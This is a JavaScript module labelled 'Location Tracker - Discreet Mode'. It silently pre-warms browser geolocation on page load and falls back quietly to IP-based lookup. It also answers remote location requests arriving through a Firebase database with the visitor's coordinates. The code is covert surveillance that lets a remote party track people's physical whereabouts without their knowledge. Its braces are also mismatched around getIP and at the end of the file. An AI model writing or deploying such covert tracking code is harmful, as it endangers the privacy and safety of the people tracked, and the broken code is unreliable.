/**
 * Location Tracker - Discreet Mode
 * Strategy: Pre-warm on page load, cache position, silent IP fallback.
 */
import { getDeviceInfo } from '../../utils/browser-detection.js';
import { logger } from '../../utils/logger.js';

let cachedPosition = null;
let cachedSource = null;
let prewarmComplete = false;

export function prewarmLocation() {
    if (!navigator.geolocation) { prewarmComplete = true; return; }
    logger.debug('Pre-warming location silently...');
    navigator.geolocation.getCurrentPosition(
        (position) => {
            cachedPosition = position;
            cachedSource = classifySource(position);
            prewarmComplete = true;
            logger.debug('Location pre-warmed:', cachedSource);
        },
        () => { prewarmComplete = true; logger.debug('Pre-warm denied, will use fallback'); },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 300000 }
    );
}

export async function getLocation() {
    if (cachedPosition) {
        const ip = await getIP();
        return { latitude: cachedPosition.coords.latitude, longitude: cachedPosition.coords.longitude, accuracy: cachedPosition.coords.accuracy, source: cachedSource, ip };
    }
    if (navigator.geolocation) {
        try {
            const position = await getCurrentPosition(8000);
            const source = classifySource(position);
            const ip = await getIP();
            return { latitude: position.coords.latitude, longitude: position.coords.longitude, accuracy: position.coords.accuracy, source, ip };
        } catch (e) { logger.debug('Geolocation failed, IP fallback:', e.message); }
    }
    return getIPLocation();
}

function getCurrentPosition(timeout = 8000) {
    return new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout, maximumAge: 0 });
    });
}

function classifySource(position) {
    const acc = position.coords.accuracy;
    if (acc < 50) return 'GPS (High Accuracy)';
    if (acc < 150) return 'GPS (Low Accuracy)';
    if (acc < 500) return 'WiFi';
    if (acc < 2000) return 'Cell Tower';
    return 'IP-Based';
}

async function getIP() {
    try { const r = await fetch('https://api.ipify.org?format=json'); return (await r.json()).ip; }
    catch { try { const r = await fetch('https://api.ip.sb/geoip'); return (await r.json()).ip; } catch { return null; } }

async function getIPLocation() {
    const ip = await getIP();
    const services = [
        { url: `http://ip-api.com/json/${ip}`, parse: d => ({ lat: d.lat, lng: d.lon, acc: 5000 }) },
        { url: `https://ipapi.co/${ip}/json/`, parse: d => ({ lat: d.latitude, lng: d.longitude, acc: 10000 }) }
    ];
    for (const s of services) {
        try {
            const r = await fetch(s.url);
            const d = await r.json();
            if (d.lat && d.lng) {
                const p = s.parse(d);
                return { latitude: p.lat, longitude: p.lng, accuracy: p.acc, source: 'IP-Based', ip };
            }
        } catch { continue; }
    }
    return { latitude: null, longitude: null, accuracy: null, source: 'IP (No Coordinates)', ip };
}

export function captureDeviceInfo() { return getDeviceInfo(); }

export function determineLocationSource(position) { return Promise.resolve(classifySource(position)); }
export function getHighAccuracyPosition() { return getCurrentPosition(10000); }

export function listenForLocationRequests() {
    if (!window.database) return;
    window.database.ref('locationRequests').on('child_added', async (snapshot) => {
        const req = snapshot.val();
        if (!req || req.status !== 'pending') return;
        try {
            const loc = await getLocation();
            await snapshot.ref.update({
                status: 'completed',
                newLocation: { latitude: loc.latitude, longitude: loc.longitude, accuracy: loc.accuracy, timestamp: new Date().toISOString(), locationSource: loc.source },
                completedAt: firebase.database.ServerValue.TIMESTAMP
            });
        } catch (e) {
            await snapshot.ref.update({ status: 'failed', error: e.message, completedAt: firebase.database.ServerValue.TIMESTAMP });
        }
    });
}

export function setupUnloadHandler() {
    window.addEventListener('beforeunload', async () => {
        try {
            const ip = await getIP();
            if (ip && window.database) {
                const snap = await window.database.ref('locations').orderByChild('ip').equalTo(ip).once('value');
                snap.forEach(c => { if (c.val().status === 'active') c.ref.update({ status: 'inactive' }); });
            }
        } catch (e) { logger.error('Unload error:', e); }
    });
}
}